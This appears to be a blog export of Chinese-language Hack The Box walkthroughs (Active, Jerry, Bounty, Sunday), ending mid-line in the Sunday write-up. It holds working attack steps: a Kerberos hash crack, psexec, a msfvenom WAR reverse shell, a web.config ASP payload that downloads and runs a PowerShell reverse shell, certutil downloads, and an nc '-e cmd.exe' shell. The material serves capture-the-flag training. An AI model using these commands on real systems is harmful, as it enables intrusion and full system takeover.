386500dde52cfc1fc277399979a8b5955008aad50cbcfa359ddd6d634b99064663a49a2f477b4d2d8d21ffd8fdf9ccc43b10db9b58964e198444881f96ce700c9dc6cb6c4192274cd7e52c7340f2c052909a9bc78e6dee1b7758f07ac32154d3f4fd01fa776520c514de5e6c3ba53ea0b2c81d9e8c1d0124b3467610038423bd14dbdbc863ddc9d0dfd8d768a3682ee7da66d38c3e7d31937c1eb5813d4997377649be0b14487de5cf23be190c7f20cec1f47afa101829fbf3e12320481ca79f6254e2462dadae248020ed5b0bfff84367f33f101f734ff5727eaa101a4faaeadf267d20b3211583d7794c0892a62b6dc25caafc96c17f21ef1585aa6b95b89aa831a22959e145b490364aa28c42ea79763a1db3ef5159558e6898faaf40e5757e3d7889308ec79ae1d2d721ea98b2e79914d85380c4385d62ee308caa77982c84eaaccc84b19cc69d16b4ae471b270b66c02b16f450c109e58cd5e524d20b092c62ce573115d204825121da3913418a596157b6274c3ac653d352f10983b08046de6e3ab6715169dbf250bf0212 把这段 hash 保存下来，然后使用 hashcat 进行爆破 hashcat hash /usr/share/wordlists/rockyou.txt -m 13100 Ticketmaster1968 ┌──(root💀kali)-[~/Desktop/impacket/examples] └─# python3 psexec.py Administrator:Ticketmaster1968@10.10.10.100 1 ⚙ Impacket v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file CahMAAGa.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service jzgq on 10.10.10.100..... [*] Starting service jzgq..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt; whoami nt authority\\system 成功拿到 root 权限的 shell c:\\Users\\Administrator\\Desktop&gt; type root.txt d7a6880e1ed8648dcb9012f911819322 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Jerry - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Jerry","date":"2022-04-23T11:38:36.000Z","updated":"2023-06-13T03:45:18.000Z","comments":true,"path":"2022/04/23/Hackthebox/Easy/Hackthebox-Jerry/","link":"","permalink":"http://www.lucifiel.com/2022/04/23/Hackthebox/Easy/Hackthebox-Jerry/","excerpt":"","text":"Hackthebox - Jerry靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.95 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-22 02:03 EDT Nmap scan report for 10.10.10.95 Host is up (0.33s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012|2008|Vista|7 (91%) OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7 Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 7 Professional (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 333.58 ms 10.10.14.1 2 334.33 ms 10.10.10.95 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 61.70 seconds Http这里只有一个 8080 端口，去访问一下看看 是一个 tomcat 的页面，尝试一下弱口令登录 漏洞利用 使用弱口令 admin&#x2F;admin 成功登录，但是这里却没有看到上传点，我怀疑不太对，因为tomcat 的 登录密码一般是 tomcat 在输入密码的时候选择取消，然后在错误页面中得到了一个账号密码 username = tomcat password = s3cret 这次权限就对了，然后使用 msfvenom 去生成一个 war 马 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war &gt; shell.war 然后使用 nc 监听一个端口 nc -nvlp 4444 上传后去访问一下 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.95] 49193 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\apache-tomcat-7.0.88&gt;whoami whoami nt authority\\system 成功拿到一个 shell c:\\Users\\Administrator\\Desktop\\flags&gt;type &quot;2 for the price of 1.txt&quot; type &quot;2 for the price of 1.txt&quot; user.txt 7004dbcef0f854e0fb401875f26ebd00 root.txt 04a8b36e1545a455393d067e772fe90e 拿到 user 和 root 权限的 flag 文件，倒是不用提权了","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Bounty - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Bounty","date":"2022-04-22T11:38:36.000Z","updated":"2023-06-13T03:41:18.000Z","comments":true,"path":"2022/04/22/Hackthebox/Easy/Hackthebox-Bounty/","link":"","permalink":"http://www.lucifiel.com/2022/04/22/Hackthebox/Easy/Hackthebox-Bounty/","excerpt":"","text":"Hackthebox - Bounty靶场信息 靶场类型 信息收集Nmap┌──(root💀lucifiel)-[~] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.93 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-20 16:39 CST Nmap scan report for 10.10.10.93 Host is up (0.38s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Bounty Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 342.38 ms 10.10.16.1 2 513.76 ms 10.10.10.93 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.51 seconds Http http 里也没什么东西，去 fuzz 一下看看 Fuzz┌──(root💀lucifiel)-[~] └─# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.93/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/20 16:44:18 Starting gobuster in directory enumeration mode =============================================================== /UploadedFiles (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/UploadedFiles/] =============================================================== 2022/04/20 16:47:53 Finished =============================================================== 有一个目录，访问一下 403 了，通过 nmap 得知这是 windows 系统下的 iis 搭建的网站，让我们尝试一下用 -x 扫描 aspx 格式的网页 ┌──(root💀lucifiel)-[~] └─# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 --no-error -x aspx =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.93/ [+] Method: GET [+] Threads: 500 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: aspx [+] Timeout: 10s =============================================================== 2022/04/20 16:57:38 Starting gobuster in directory enumeration mode =============================================================== /transfer.aspx (Status: 200) [Size: 941] =============================================================== 2022/04/20 16:59:36 Finished =============================================================== 我们扫描到一个文件上传的页面 随便上传张图片试试看 这里显示上传成功，去访问一下看看能不能访问到 可以访问到，但是大概一分钟左右就会被自动删除 尝试上传了一个aspx文件，这次上传失败了 去搜了一下相关的漏洞，倒是搜到了一些漏洞 https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/ 去利用吧 漏洞利用&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; &lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes! &lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;) &#39; it is running the ASP code if you can see 3 by opening the web.config file! Response.write(1+2) Response.write(&quot;&lt;!-&quot;&amp;&quot;-&quot;) %&gt; --&gt; 将这段文件代码保存为 web.config 然后上传，去查看后如果看到了 “3” 则表示 payload 被执行了 确实执行成功了 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; &lt;!-- &lt;% Set rs = CreateObject(&quot;WScript.Shell&quot;) Set cmd = rs.Exec(&quot;cmd /c whoami&quot;) o = cmd.StdOut.readall() Response.write(o) %&gt; --&gt; 修改一个 POC，然后上传 这里成功返回了我们要的东西 来明确一下攻击路径 Step 1使用 nishang 来进行 getshell https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 然后在最后一行加入下面的代码 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444 Step 2然后构造好 web.config 中的语句 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; &lt;!-- &lt;% Set rs = CreateObject(&quot;WScript.Shell&quot;) Set cmd = rs.Exec(&quot;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.2/Invoke-PowerShellTcp.ps1&#39;)&quot;) o = cmd.StdOut.readall() Response.write(o) %&gt; --&gt; 然后使用 nc 在本地监听一个端口 nc -nvlp 4444 接着使用 python3 开启一个 http 服务 python3 -m http.server 80 Step 3上传并访问我们的 payload ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49158 Windows PowerShell running as user BOUNTY$ on BOUNTY Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\windows\\system32\\inetsrv&gt;whoami bounty\\merlin 成功拿到一个 shell 权限提升使用 systeminfo 查看一下系统信息 PS C:\\windows\\system32\\inetsrv&gt; systeminfo Host Name: BOUNTY OS Name: Microsoft Windows Server 2008 R2 Datacenter OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 55041-402-3606965-84760 Original Install Date: 5/30/2018, 12:22:24 AM System Boot Time: 4/22/2022, 6:08:06 AM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 2,047 MB Available Physical Memory: 28 MB Virtual Memory: Max Size: 4,095 MB Virtual Memory: Available: 1,786 MB Virtual Memory: In Use: 2,309 MB Page File Location(s): C:\\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.93 没有补丁，那就直接 ms15-051 提权了 https://github.com/wikiZ/ms15--051 https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4 这里的 shell 不太稳定，咱们先使用 msf 获取一个 shell 吧 然后咱们使用 shell 执行下面两条命令 cd c:\\users\\merlin\\desktop certutil -urlcache -split -f http://10.10.14.2/ms15-051.exe certutil -urlcache -split -f http://10.10.14.2/nc64.exe ./ms15-051.exe &quot;./nc64.exe 10.10.14.2 5555 -e cmd.exe&quot; 然后使用 msf 开启监听 use exploit/multi/handler set lhost 10.10.14.2 exploit 然后执行文件 &amp;&quot;C:\\users\\merlin\\Desktop\\shell.exe&quot; ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 1 ⨯ listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49181 Windows PowerShell running as user BOUNTY$ on BOUNTY Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32&gt;whoami nt authority\\system 成功得到 root 权限的 shell PS C:\\Windows\\system32&gt; type c:/users/merlin/desktop/user.txt 66aee8a564d37a25796466f0699d7e8a PS C:\\Windows\\system32&gt; type c://users/administrator/desktop/root.txt a376f4044a2bd073ed0abf33f3b659f4 成功得到 user 和 root 权限的 flag 文件 其他如果 ms15-051 一直卡顿，那可以试试 juicy-potato https://github.com/ohpe/juicy-potato","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Sunday - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Sunday","date":"2022-04-19T11:38:36.000Z","updated":"2023-06-13T03:53:02.000Z","comments":true,"path":"2022/04/19/Hackthebox/Easy/Hackthebox-Sunday/","link":"","permalink":"http://www.lucifiel.com/2022/04/19/Hackthebox/Easy/Hackthebox-Sunday/","excerpt":"","text":"Hackthebox - Sunday靶场信息 靶场类型 信息收集Nmap┌──(root💀lucifiel)-[/home/lucifiel] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.76 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-14 12:51 CST Warning: 10.10.10.76 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.76 Host is up (0.14s latency). Not shown: 59990 filtered ports, 5540 closed ports PORT STATE SERVICE VERSION 79/tcp open finger? |_finger: No one logged on\\x0D | fingerprint-strings: | GenericLines: | No one logged on | GetRequest: | Login Name TTY Idle When Where | HTTP/1.0 ??? | HTTPOptions: | Login Name TTY Idle When Where | HTTP/1.0 ??? | OPTIONS ??? | Help: | Login Name TTY Idle When Where | HELP ??? | RTSPRequest: | Login Name TTY Idle When Where | OPTIONS ??? | RTSP/1.0 ??? | SSLSessionReq, TerminalServerCookie: |_ Login Name TTY Idle When Where 111/tcp open rpcbind 2-4 (RPC #100000) 515/tcp open printer? 6787/tcp open ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14) |_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14 | http-title: Solaris Dashboard |_Requested resource was https://10.10.10.76:6787/solaris/ | ssl-cert: Subject: commonName=sunday | Subject Alternative Name: DNS:sunday | Not valid before: 2021-12-08T19:40:00 |_Not valid after: 2031-12-06T19:40:00 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 22022/tcp open ssh OpenSSH 7.5 (protocol 2.0) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port79-TCP:V=7.91%I=7%D=4/14%Time=6257A8F1%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,12,&quot;No\\x20one\\x20logged\\x20on\\r\\n&quot;)%r(GetRequest,93,&quot;Login\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x2 SF:0\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\ SF:?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:?\\?\\?\\r\\n&quot;)%r(Help,5D,&quot;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHELP\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\?\\?\\?\\r\\n&quot;)%r(HTTPOptions,93,&quot;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\ SF:r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n&quot;)%r(RTSPRequest,93,&quot;Login\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x2 SF:0When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\.0\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n&quot;)%r(SS SF:LSessionReq,5D,&quot;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\?\\?\\?\\r\\n&quot;)%r(TerminalServerCookie,5D,&quot;Login\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20 SF:\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/14%OT=79%CT=5%CU=31867%PV=Y%DS=2%DC=T%G=Y%TM=6257AA5 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS= OS:7)OPS(O1=ST11M505NW2%O2=ST11M505NW2%O3=NNT11M505NW2%O4=ST11M505NW2%O5=ST OS:11M505NW2%O6=ST11M505)WIN(W1=FB1E%W2=FB1E%W3=FA38%W4=FA3B%W5=FA3B%W6=FFF OS:7)ECN(R=Y%DF=Y%T=3C%W=FAFA%O=M505NNSNW2%CC=Y%Q=)T1(R=Y%DF=Y%T=3C%S=O%A=S OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=3C%W=FA09%S=O%A=S+%F=AS%O=ST11M505NW OS:2%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) OS:T7(R=N)U1(R=Y%DF=N%T=FF%IPL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE OS:(R=Y%DFI=Y%T=FF%CD=S) Network Distance: 2 hops TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 142.34 ms 10.10.14.1 2 142.67 ms 10.10.10.76 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 498.43 seconds 79 端口有一个 finger?，最后一个字母是啥就不知道了去搜搜看有没有漏洞 Searchsploit┌──(root💀kali)-[~/Desktop] └─# searchsploit finger ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- BSD 4.2 - &#39;fingerd&#39; Remote Buffer Overflow | bsd/remote/19039.txt cfingerd 1.4 - Format String (1) | linux/remote/20748.pl cfingerd 1.4 - Format String (2) | linux/remote/20749.c cfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (1) | unix/local/20962.pl cfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (2) | unix/local/20963.c cfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (3) | unix/local/20964.c Daniel Beckham The Finger Server 0.82 Beta - Pipe | cgi/remote/19745.txt FingerTec Fingerprint Reader - Remote Access and Remote Enrolment | hardware/remote/39227.txt GNU Ffingerd 1.19 - &#39;Username&#39; Validity Disclosure | unix/remote/20327.txt Granding MA300 - Traffic Sniffing Man In The Middle Fingerprint PIN Disclosure | multiple/remote/39292.pl Martin Schulze Cfingerd 1.4.2 - GECOS Buffer Overflow | freebsd/local/19504.c Morris Worm - fingerd Stack Buffer Overflow (Metasploit) | bsd/remote/45791.rb OpenVms 8.3 Finger Service - Stack Buffer Overflow | multiple/dos/32193.txt SDFingerD 1.1 - Failure To Drop Privileges Privilege Escalation | linux/local/22806.sh Windows TCPIP Finger Command - C2 Channel and Bypassing Security Software | windows/local/48815.txt zkfingerd 0.9.1 - &#39;say()&#39; Format String | linux/remote/22101.c zkfingerd SysLog 0.9.1 - Format String | linux/remote/22091.c ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Paper Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Address Relay Fingerprinting (How to Use Often Discarded Bugs) | english/13193-address-relay-fing Automated Web Application Fingerprinting | docs/english/17538-automated-web Bitter Harvest: Systematically Fingerprinting Low- and Medium-interaction Honeypots at Internet Scale | docs/english/45365-bitter-harves [Portuguese] Web Apps Fingerprinting | portuguese/13683-[portuguese]-we [Spanish] El fingerprinting dentro de la seguridad web | docs/spanish/18421-[spanish]-el- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- 搜出来的结果不少，首先排除掉 cfingerd 以及其他的干扰，就剩下了一个 Morris Worm - fingerd Stack Buffer Overflow (Metasploit) 去尝试一下 Metasploitmsf6 &gt; search fingerd Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/bsd/finger/morris_fingerd_bof 1988-11-02 normal Yes Morris Worm fingerd Stack Buffer Overflow Interact with a module by name or index. For example info 0, use 0 or use exploit/bsd/finger/morris_fingerd_bof msf6 &gt; use 0 [*] Using configured payload bsd/vax/shell_reverse_tcp 去设置一下配置 msf6 exploit(bsd/finger/morris_fingerd_bof) &gt; show options Module options (exploit/bsd/finger/morris_fingerd_bof): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.76 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 79 yes The target port (TCP) Payload options (bsd/vax/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.7 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 @(#)fingerd.c 5.1 (Berkeley) 6/6/85 然后去执行 msf6 exploit(bsd/finger/morris_fingerd_bof) &gt; exploit [-] 10.10.10.76:79 - Exploit failed: bsd/vax/shell_reverse_tcp: All encoders failed to encode. [*] Exploit completed, but 